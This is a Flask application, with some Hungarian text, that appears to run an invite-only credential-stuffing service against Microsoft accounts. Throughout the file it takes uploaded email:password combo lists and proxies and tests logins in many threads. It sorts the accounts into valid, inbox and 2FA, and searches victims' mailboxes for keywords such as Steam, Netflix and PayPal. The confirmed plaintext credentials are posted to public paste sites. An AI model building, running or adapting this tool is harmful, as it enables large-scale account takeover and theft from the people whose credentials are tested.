import os
import json
import time
import secrets
import threading
from datetime import datetime
from functools import wraps
from urllib.parse import urlparse

from dotenv import load_dotenv
from flask import (
    Flask, render_template, request, redirect,
    url_for, session, flash, jsonify
)
from flask_socketio import SocketIO, emit, join_room
from werkzeug.security import (
    generate_password_hash, check_password_hash
)
from pymongo import MongoClient, DESCENDING
from bson import ObjectId

# ══════════════════════════════════════════
#  .ENV BETÖLTÉS
# ══════════════════════════════════════════

load_dotenv()

# ══════════════════════════════════════════
#  APP CONFIG
# ══════════════════════════════════════════

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', secrets.token_hex(32))

MAX_UPLOAD_MB = int(os.getenv('MAX_UPLOAD_MB', '50'))
app.config['MAX_CONTENT_LENGTH'] = MAX_UPLOAD_MB * 1024 * 1024

MAX_SCAN_THREADS = int(os.getenv('MAX_SCAN_THREADS', '50'))

# THREADING mód: stabil, nem függ az eventlet-től, Renderen tökéletes
socketio = SocketIO(
    app, cors_allowed_origins="*", async_mode='threading'
)

os.makedirs('uploads', exist_ok=True)
os.makedirs('static', exist_ok=True)

ADMIN_EMAIL = os.getenv('ADMIN_EMAIL', 'admin@admin.com')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin123')

# ══════════════════════════════════════════
#  MONGODB - DB NÉV AUTOMATIKUSAN AZ URI-BÓL
# ══════════════════════════════════════════

MONGO_URI = os.getenv(
    'MONGO_URI', 'mongodb://localhost:27017/updh_checker'
)


def get_db_name_from_uri(uri):
    """Kiszedi a database nevet a MongoDB URI-ból."""
    try:
        parsed = urlparse(uri)
        path = parsed.path
        if path.startswith('/'):
            path = path[1:]
        if path and path.strip():
            return path.strip()
    except Exception:
        pass
    return 'updh_checker'


DB_NAME = get_db_name_from_uri(MONGO_URI)

try:
    mongo_client = MongoClient(
        MONGO_URI, serverSelectionTimeoutMS=5000
    )
    mongo_client.server_info()
    print(f"[OK] MongoDB connected")
    print(f"[OK] Database: {DB_NAME}")
except Exception as e:
    print(f"[ERROR] MongoDB connection failed: {e}")
    print(f"[INFO] URI: {MONGO_URI[:30]}...")
    print("[INFO] Check your .env file!")
    exit(1)

db = mongo_client[DB_NAME]

users_col = db['users']
invites_col = db['invite_codes']
jobs_col = db['scan_jobs']
results_col = db['scan_results']

users_col.create_index('email', unique=True)
invites_col.create_index('code', unique=True)
jobs_col.create_index('user_id')
results_col.create_index('job_id')

# ══════════════════════════════════════════
#  ADMIN INIT
# ══════════════════════════════════════════

existing_admin = users_col.find_one({'email': ADMIN_EMAIL})
if not existing_admin:
    users_col.insert_one({
        'email': ADMIN_EMAIL,
        'password_hash': generate_password_hash(
            ADMIN_PASSWORD
        ),
        'is_admin': True,
        'is_active': True,
        'created_at': datetime.utcnow()
    })
    print(f"[OK] Admin created: {ADMIN_EMAIL}")
else:
    print(f"[OK] Admin exists: {ADMIN_EMAIL}")


# ══════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════

def to_dict(doc):
    if doc is None:
        return None
    d = dict(doc)
    if '_id' in d:
        d['id'] = str(d.pop('_id'))
    for key, val in list(d.items()):
        if isinstance(val, ObjectId):
            d[key] = str(val)
        elif isinstance(val, datetime):
            d[key] = val.strftime('%Y-%m-%d %H:%M:%S')
    return d


def to_dicts(cursor):
    return [to_dict(doc) for doc in cursor]


def get_oid(val):
    try:
        return ObjectId(val)
    except Exception:
        return None


# ══════════════════════════════════════════
#  AUTH DECORATORS
# ══════════════════════════════════════════

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
            
        uid = get_oid(session['user_id'])
        user = users_col.find_one({'_id': uid})
        if not user:
            session.clear()
            return redirect(url_for('login'))
            
        # 1. Check if user account is frozen
        if not user.get('is_active', True):
            session.clear()
            if uid in active_scans:
                active_scans[uid].stop()
            flash('A fiókodat felfüggesztették.', 'error')
            return redirect(url_for('login'))
            
        # 2. Check their invite code (unless they are admin)
        if not user.get('is_admin'):
            invite = invites_col.find_one({'used_by': uid})
            if not invite:
                # Invite was completely deleted.
                if uid in active_scans:
                    active_scans[uid].stop()
                if request.endpoint not in ('reactivate', 'logout', 'static'):
                    return redirect(url_for('reactivate'))
            elif not invite.get('is_active', True):
                # Invite is frozen
                session.clear()
                if uid in active_scans:
                    active_scans[uid].stop()
                flash('A meghívódat felfüggesztették.', 'error')
                return redirect(url_for('login'))
                
        return f(*args, **kwargs)
    return decorated


def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        user = users_col.find_one(
            {'_id': get_oid(session['user_id'])}
        )
        if not user or not user.get('is_admin'):
            flash('Access denied', 'error')
            return redirect(url_for('dashboard'))
        return f(*args, **kwargs)
    return decorated


# ══════════════════════════════════════════
#  SCAN MANAGER
# ══════════════════════════════════════════

active_scans = {}


class ScanManager:
    def __init__(self, job_id, user_id, accounts,
                 keywords, proxies_list):
        self.job_id = job_id
        self.user_id = user_id
        self.accounts = accounts
        self.keywords = keywords
        self.proxies = proxies_list
        self.status = 'idle'
        self.pause_event = threading.Event()
        self.pause_event.set()
        self.stop_event = threading.Event()
        self.stats = {
            'checked': 0, 'valid': 0, 'inbox': 0,
            'bad': 0, 'twofa': 0, 'errors': 0
        }
        self.start_time = None
        self.results_valid = []
        self.results_inbox = []
        self.results_2fa = []
        self.results_bad = []
        self.lock = threading.Lock()

    def start(self):
        self.status = 'running'
        self.start_time = time.time()
        self._update_db('running')
        t = threading.Thread(target=self._run, daemon=True)
        t.start()

    def pause(self):
        if self.status == 'running':
            self.status = 'paused'
            self.pause_event.clear()
            self._update_db('paused')

    def resume(self):
        if self.status == 'paused':
            self.status = 'running'
            self.pause_event.set()
            self._update_db('running')

    def stop(self):
        self.status = 'stopped'
        self.stop_event.set()
        self.pause_event.set()
        self._update_db('stopped')

    def _update_db(self, status):
        try:
            update = {
                'status': status,
                'checked': self.stats['checked'],
                'valid': self.stats['valid'],
                'inbox': self.stats['inbox'],
                'bad': self.stats['bad'],
                'twofa': self.stats['twofa'],
                'errors': self.stats['errors']
            }
            if status in ('stopped', 'completed'):
                update['finished_at'] = datetime.utcnow()
            jobs_col.update_one(
                {'_id': self.job_id}, {'$set': update}
            )
        except Exception:
            pass

    def _save_result_db(self, email, password, status,
                        country, kw_hits, kw_dates):
        try:
            results_col.insert_one({
                'job_id': self.job_id,
                'email': email,
                'password': password,
                'status': status,
                'country': country or '',
                'keyword_hits': kw_hits or {},
                'keyword_dates': kw_dates or {},
                'created_at': datetime.utcnow()
            })
        except Exception:
            pass

    def _emit_result(self, data):
        room = f'user_{self.user_id}'
        socketio.emit('scan_result', data, room=room)

    def _emit_stats(self):
        elapsed = (
            time.time() - self.start_time
            if self.start_time else 1
        )
        cpm = (
            int(self.stats['checked'] / elapsed * 60)
            if elapsed > 1 else 0
        )
        room = f'user_{self.user_id}'
        socketio.emit('scan_stats', {
            **self.stats,
            'total': len(self.accounts),
            'cpm': cpm,
            'status': self.status
        }, room=room)

    def _run(self):
        from checker import MicrosoftInboxChecker, format_proxy
        import random
        from collections import deque

        q = deque(self.accounts)
        max_t = min(MAX_SCAN_THREADS, len(self.accounts))
        sem = threading.BoundedSemaphore(max_t)

        def process(combo):
            try:
                self.pause_event.wait()
                if self.stop_event.is_set():
                    return
                if ':' not in combo:
                    return

                email, password = combo.split(':', 1)
                email = email.strip()
                password = password.strip()

                proxy = None
                if self.proxies:
                    proxy = format_proxy(
                        random.choice(self.proxies)
                    )

                checker = MicrosoftInboxChecker(
                    email, password, proxy,
                    inbox_keywords=self.keywords
                )
                login_st = checker.login()

                if login_st == 'SUCCESS':
                    graph_token = checker.get_graph_token()
                    country = 'Unknown'
                    if graph_token:
                        if checker.get_profile_via_graph(
                            graph_token
                        ):
                            country = (
                                checker.country or 'Unknown'
                            )
                    if country == 'Unknown':
                        if checker.get_profile_via_substrate():
                            country = (
                                checker.country or 'Unknown'
                            )

                    total_c, hits, kw_dates = \
                        checker.check_inbox()

                    rd = {
                        'email': email,
                        'password': password,
                        'status': 'valid',
                        'country': country,
                        'keyword_hits': {},
                        'keyword_dates': {},
                        'total_emails': total_c
                    }

                    if total_c > 0:
                        with self.lock:
                            self.stats['valid'] += 1
                            self.stats['inbox'] += 1
                        rd['status'] = 'inbox'
                        kw_dict = {}
                        for hit in hits:
                            if ': ' in hit:
                                kw, cnt = hit.rsplit(': ', 1)
                                try:
                                    kw_dict[kw] = int(cnt)
                                except ValueError:
                                    kw_dict[kw] = cnt
                        rd['keyword_hits'] = kw_dict
                        rd['keyword_dates'] = kw_dates
                        with self.lock:
                            self.results_inbox.append(rd)
                    else:
                        with self.lock:
                            self.stats['valid'] += 1
                            self.results_valid.append(rd)

                    self._save_result_db(
                        email, password, rd['status'],
                        country, rd['keyword_hits'],
                        rd['keyword_dates']
                    )
                    self._emit_result(rd)

                elif login_st == '2FA':
                    with self.lock:
                        self.stats['twofa'] += 1
                        self.results_2fa.append({
                            'email': email,
                            'password': password,
                            'status': '2fa'
                        })
                    self._save_result_db(
                        email, password, '2fa', '', {}, {}
                    )
                    self._emit_result({
                        'email': email,
                        'password': password,
                        'status': '2fa'
                    })

                else:
                    with self.lock:
                        self.stats['bad'] += 1
                        self.results_bad.append({
                            'email': email,
                            'password': password,
                            'status': 'bad'
                        })
                    self._emit_result({
                        'email': email,
                        'password': password,
                        'status': 'bad'
                    })

            except Exception:
                with self.lock:
                    self.stats['errors'] += 1
            finally:
                with self.lock:
                    self.stats['checked'] += 1
                self._emit_stats()
                self._update_db(self.status)
                sem.release()

        while q and not self.stop_event.is_set():
            self.pause_event.wait()
            if self.stop_event.is_set():
                break
            sem.acquire()
            if self.stop_event.is_set():
                sem.release()
                break
            combo = q.popleft()
            t = threading.Thread(
                target=process, args=(combo,), daemon=True
            )
            t.start()

        for _ in range(max_t):
            sem.acquire()

        if self.status != 'stopped':
            self.status = 'completed'
        self._update_db(self.status)
        self._emit_stats()

        sid = str(self.job_id)
        if sid in active_scans:
            del active_scans[sid]

    def get_upload_data(self):
        valid_lines = []
        for r in self.results_valid:
            line = f"{r['email']}:{r['password']}"
            if r.get('country'):
                line += f" | {r['country']}"
            valid_lines.append(line)

        inbox_lines = []
        for r in self.results_inbox:
            line = f"{r['email']}:{r['password']}"
            if r.get('country'):
                line += f" | {r['country']}"
            if r.get('keyword_hits'):
                hits = ' | '.join(
                    f"{k}: {v}"
                    for k, v in r['keyword_hits'].items()
                )
                line += f" | [{hits}]"
            if r.get('keyword_dates'):
                dates = ' | '.join(
                    f"{k}: {v}"
                    for k, v in r['keyword_dates'].items()
                    if v != 'N/A'
                )
                if dates:
                    line += f" | Dates: [{dates}]"
            inbox_lines.append(line)

        twofa_lines = []
        for r in self.results_2fa:
            line = f"{r['email']}:{r['password']}"
            twofa_lines.append(line)

        return valid_lines, inbox_lines, twofa_lines


# ══════════════════════════════════════════
#  UPLOAD
# ══════════════════════════════════════════

def upload_to_paste(content, title="Results"):
    import requests as req
    try:
        r = req.post('https://dpaste.org/api/', data={
            'content': content,
            'title': title,
            'syntax': 'text',
            'expiry_days': 30
        }, timeout=15)
        if r.status_code in (200, 201):
            return r.text.strip()
    except Exception:
        pass
    try:
        r = req.post(
            'https://ix.io',
            data={'f:1': content},
            timeout=15
        )
        if r.status_code == 200:
            return r.text.strip()
    except Exception:
        pass
    return None


# ══════════════════════════════════════════
#  COMBO
# ══════════════════════════════════════════

def normalize_combo(line):
    line = line.strip()
    if not line:
        return None
    for sep in [':', '|', ';', ',', '\t', ' ']:
        if sep in line:
            parts = line.split(sep, 1)
            email = parts[0].strip()
            pw = parts[1].strip()
            if email and pw and '@' in email:
                return f"{email}:{pw}"
    return None


# ══════════════════════════════════════════
#  AUTH ROUTES
# ══════════════════════════════════════════

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email', '').strip().lower()
        password = request.form.get('password', '')

        user = users_col.find_one({'email': email})
        if user and check_password_hash(
            user['password_hash'], password
        ):
            if not user.get('is_active', True):
                flash('Account is disabled', 'error')
                return render_template('login.html')

            session['user_id'] = str(user['_id'])
            session['user_email'] = user['email']
            session['is_admin'] = bool(
                user.get('is_admin', False)
            )
            return redirect(url_for('dashboard'))
        flash('Invalid email or password', 'error')

    return render_template('login.html')


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        email = request.form.get('email', '').strip().lower()
        password = request.form.get('password', '')
        confirm = request.form.get('confirm_password', '')
        invite = request.form.get('invite_code', '').strip()

        if not email or not password:
            flash('All fields required', 'error')
            return render_template('register.html')
        if password != confirm:
            flash('Passwords do not match', 'error')
            return render_template('register.html')

        code_doc = invites_col.find_one({
            'code': invite,
            'is_active': True,
            'used_by': None
        })
        if not code_doc:
            flash('Invalid or used invite code', 'error')
            return render_template('register.html')

        if users_col.find_one({'email': email}):
            flash('Email already registered', 'error')
            return render_template('register.html')

        result = users_col.insert_one({
            'email': email,
            'password_hash': generate_password_hash(password),
            'is_admin': False,
            'is_active': True,
            'created_at': datetime.utcnow()
        })

        invites_col.update_one(
            {'_id': code_doc['_id']},
            {'$set': {
                'used_by': result.inserted_id,
                'used_at': datetime.utcnow()
            }}
        )

        flash('Registration successful!', 'success')
        return redirect(url_for('login'))

    return render_template('register.html')


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/reactivate', methods=['GET', 'POST'])
def reactivate():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    uid = get_oid(session['user_id'])
    user = users_col.find_one({'_id': uid})
    if not user:
        session.clear()
        return redirect(url_for('login'))
        
    # Check if they really need to reactivate
    invite = invites_col.find_one({'used_by': uid})
    if invite:
        return redirect(url_for('dashboard')) # They have a valid invite
        
    if request.method == 'POST':
        new_code = request.form.get('invite_code', '').strip()
        if not new_code:
            flash('Kérlek add meg a kódot.', 'error')
            return redirect(url_for('reactivate'))
            
        code_doc = invites_col.find_one({'code': new_code})
        if not code_doc:
            flash('Érvénytelen kód.', 'error')
            return redirect(url_for('reactivate'))
        if code_doc.get('used_by'):
            flash('Ez a kód már fel van használva.', 'error')
            return redirect(url_for('reactivate'))
        if not code_doc.get('is_active', True):
            flash('Ez a kód fel van függesztve.', 'error')
            return redirect(url_for('reactivate'))
            
        # Assign the new invite code to the user
        invites_col.update_one(
            {'_id': code_doc['_id']},
            {'$set': {
                'used_by': uid,
                'used_at': datetime.utcnow()
            }}
        )
        flash('Sikeres újraaktiválás! Új kód beváltva.', 'success')
        return redirect(url_for('dashboard'))
        
    return render_template('reactivate.html')


# ══════════════════════════════════════════
#  DASHBOARD ROUTES
# ══════════════════════════════════════════

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')


@app.route('/history')
@login_required
def history():
    cursor = jobs_col.find(
        {'user_id': get_oid(session['user_id'])}
    ).sort('created_at', DESCENDING)
    jobs = to_dicts(cursor)
    return render_template('history.html', jobs=jobs)


@app.route('/results/<job_id>')
@login_required
def result_detail(job_id):
    oid = get_oid(job_id)
    if not oid:
        flash('Invalid job ID', 'error')
        return redirect(url_for('history'))

    job = jobs_col.find_one({
        '_id': oid,
        'user_id': get_oid(session['user_id'])
    })
    if not job:
        flash('Job not found', 'error')
        return redirect(url_for('history'))

    results = list(results_col.find(
        {'job_id': oid}
    ).sort('created_at', DESCENDING))

    return render_template(
        'result_detail.html',
        job=to_dict(job),
        results=to_dicts(results)
    )


# ══════════════════════════════════════════
#  SCAN API
# ══════════════════════════════════════════

@app.route('/api/start-scan', methods=['POST'])
@login_required
def start_scan():
    uid = session['user_id']

    for scan in active_scans.values():
        if scan.user_id == uid and scan.status == 'running':
            return jsonify({
                'error': 'A scan is already running'
            }), 400

    combo_file = request.files.get('combo_file')
    kw_text = request.form.get('keywords', '').strip()
    proxy_file = request.files.get('proxy_file')

    if not combo_file:
        return jsonify({'error': 'No combo file'}), 400

    content = combo_file.read().decode('utf-8', errors='ignore')
    accounts = []
    for line in content.splitlines():
        n = normalize_combo(line)
        if n:
            accounts.append(n)

    if not accounts:
        return jsonify({
            'error': 'No valid accounts found'
        }), 400

    keywords = [
        k.strip()
        for k in kw_text.replace(',', '\n').splitlines()
        if k.strip()
    ]
    if not keywords:
        keywords = ['Steam', 'Netflix', 'PayPal']

    proxies_list = []
    if proxy_file:
        pc = proxy_file.read().decode('utf-8', errors='ignore')
        proxies_list = [
            l.strip() for l in pc.splitlines() if l.strip()
        ]

    result = jobs_col.insert_one({
        'user_id': get_oid(uid),
        'keywords': keywords,
        'status': 'running',
        'created_at': datetime.utcnow(),
        'finished_at': None,
        'total_accounts': len(accounts),
        'bad': 0, 'twofa': 0, 'errors': 0,
        'upload_url_valid': '',
        'upload_url_inbox': '',
        'upload_url_2fa': ''
    })

    job_id = result.inserted_id
    scan = ScanManager(
        job_id, uid, accounts, keywords, proxies_list
    )
    active_scans[str(job_id)] = scan
    scan.start()

    return jsonify({
        'job_id': str(job_id),
        'total': len(accounts),
        'keywords': keywords
    })


@app.route('/api/pause-scan', methods=['POST'])
@login_required
def pause_scan():
    uid = session['user_id']
    for scan in active_scans.values():
        if scan.user_id == uid:
            if scan.status == 'running':
                scan.pause()
                return jsonify({'status': 'paused'})
            elif scan.status == 'paused':
                scan.resume()
                return jsonify({'status': 'running'})
    return jsonify({'error': 'No active scan'}), 404


@app.route('/api/stop-scan', methods=['POST'])
@login_required
def stop_scan():
    uid = session['user_id']
    upload_urls = {}

    for scan_id, scan in list(active_scans.items()):
        if scan.user_id == uid:
            scan.stop()

            valid_lines, inbox_lines, twofa_lines = scan.get_upload_data()

            if valid_lines:
                url = upload_to_paste(
                    '\n'.join(valid_lines),
                    f"Valid - Job {scan_id}"
                )
                if url:
                    upload_urls['valid'] = url

            if inbox_lines:
                url = upload_to_paste(
                    '\n'.join(inbox_lines),
                    f"Inbox - Job {scan_id}"
                )
                if url:
                    upload_urls['inbox'] = url

            if twofa_lines:
                url = upload_to_paste(
                    '\n'.join(twofa_lines),
                    f"2FA - Job {scan_id}"
                )
                if url:
                    upload_urls['2fa'] = url

            jobs_col.update_one(
                {'_id': scan.job_id},
                {'$set': {
                    'upload_url_valid': upload_urls.get('valid', ''),
                    'upload_url_inbox': upload_urls.get('inbox', ''),
                    'upload_url_2fa': upload_urls.get('2fa', '')
                }}
            )

            job_doc = jobs_col.find_one({'_id': scan.job_id})
            if job_doc:
                # Need to update socket emission of upload_links
                pass

            return jsonify({
                'status': 'stopped',
                'upload_urls': upload_urls
            })

    return jsonify({'error': 'No active scan'}), 404


@app.route('/api/scan-status')
@login_required
def scan_status():
    uid = session['user_id']
    for scan in active_scans.values():
        if scan.user_id == uid:
            elapsed = (
                time.time() - scan.start_time
                if scan.start_time else 1
            )
            cpm = (
                int(scan.stats['checked'] / elapsed * 60)
                if elapsed > 1 else 0
            )
            return jsonify({
                **scan.stats,
                'total': len(scan.accounts),
                'cpm': cpm,
                'status': scan.status,
                'job_id': str(scan.job_id)
            })
    return jsonify({'status': 'idle'})


@app.route('/api/job-results/<job_id>')
@login_required
def job_results_api(job_id):
    oid = get_oid(job_id)
    if not oid:
        return jsonify({'error': 'Invalid ID'}), 400

    job = jobs_col.find_one({
        '_id': oid,
        'user_id': get_oid(session['user_id'])
    })
    if not job:
        return jsonify({'error': 'Not found'}), 404

    results = list(results_col.find({'job_id': oid}))
    data = []
    for r in results:
        data.append({
            'email': r['email'],
            'password': r['password'],
            'status': r['status'],
            'country': r.get('country', ''),
            'keyword_hits': r.get('keyword_hits', {}),
            'keyword_dates': r.get('keyword_dates', {}),
            'created_at': (
                r['created_at'].strftime(
                    '%Y-%m-%d %H:%M:%S'
                )
                if isinstance(r['created_at'], datetime)
                else str(r.get('created_at', ''))
            )
        })

    return jsonify({
        'job': to_dict(job),
        'results': data
    })


# ══════════════════════════════════════════
#  ADMIN ROUTES
# ══════════════════════════════════════════

@app.route('/admin')
@admin_required
def admin_panel():
    users = to_dicts(
        users_col.find().sort('created_at', DESCENDING)
    )

    codes_raw = list(
        invites_col.find().sort('created_at', DESCENDING)
    )
    codes = []
    for c in codes_raw:
        cd = to_dict(c)
        if c.get('created_by'):
            creator = users_col.find_one(
                {'_id': c['created_by']}
            )
            cd['creator_email'] = (
                creator['email'] if creator else ''
            )
        else:
            cd['creator_email'] = ''
        if c.get('used_by'):
            used = users_col.find_one(
                {'_id': c['used_by']}
            )
            cd['user_email'] = (
                used['email'] if used else ''
            )
        else:
            cd['user_email'] = ''
        codes.append(cd)

    return render_template(
        'admin.html', users=users, codes=codes
    )


@app.route('/admin/generate-invite', methods=['POST'])
@admin_required
def generate_invite():
    count = min(int(request.form.get('count', 1)), 50)
    for _ in range(count):
        code = secrets.token_urlsafe(12)
        invites_col.insert_one({
            'code': code,
            'created_by': get_oid(session['user_id']),
            'used_by': None,
            'is_active': True,
            'created_at': datetime.utcnow(),
            'used_at': None
        })
    flash(f'{count} invite code(s) generated', 'success')
    return redirect(url_for('admin_panel'))


@app.route('/admin/toggle-invite/<code_id>')
@admin_required
def toggle_invite(code_id):
    oid = get_oid(code_id)
    if oid:
        doc = invites_col.find_one({'_id': oid})
        if doc:
            invites_col.update_one(
                {'_id': oid},
                {'$set': {
                    'is_active': not doc.get(
                        'is_active', True
                    )
                }}
            )
    return redirect(url_for('admin_panel'))


@app.route('/admin/delete-invite/<code_id>')
@admin_required
def delete_invite(code_id):
    oid = get_oid(code_id)
    if oid:
        invites_col.delete_one({'_id': oid})
    return redirect(url_for('admin_panel'))


@app.route('/admin/toggle-user/<user_id>')
@admin_required
def toggle_user(user_id):
    if user_id == session['user_id']:
        flash('Cannot disable yourself', 'error')
        return redirect(url_for('admin_panel'))
    oid = get_oid(user_id)
    if oid:
        doc = users_col.find_one({'_id': oid})
        if doc:
            users_col.update_one(
                {'_id': oid},
                {'$set': {
                    'is_active': not doc.get(
                        'is_active', True
                    )
                }}
            )
    return redirect(url_for('admin_panel'))


@app.route('/admin/delete-user/<user_id>')
@admin_required
def delete_user(user_id):
    if user_id == session['user_id']:
        flash('Cannot delete yourself', 'error')
        return redirect(url_for('admin_panel'))
    oid = get_oid(user_id)
    if oid:
        users_col.delete_one({'_id': oid})
        flash('User deleted', 'success')
    return redirect(url_for('admin_panel'))


# ══════════════════════════════════════════
#  SOCKETIO EVENTS
# ══════════════════════════════════════════

@socketio.on('connect')
def handle_connect():
    if 'user_id' in session:
        join_room(f'user_{session["user_id"]}')


@socketio.on('join')
def handle_join(data):
    if 'user_id' in session:
        join_room(f'user_{session["user_id"]}')


# ══════════════════════════════════════════
#  START
# ══════════════════════════════════════════

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    debug_mode = os.getenv('DEBUG', 'False').lower() == 'true'
    # ...
    socketio.run(app, host='0.0.0.0', port=port, debug=debug_mode, allow_unsafe_werkzeug=True)
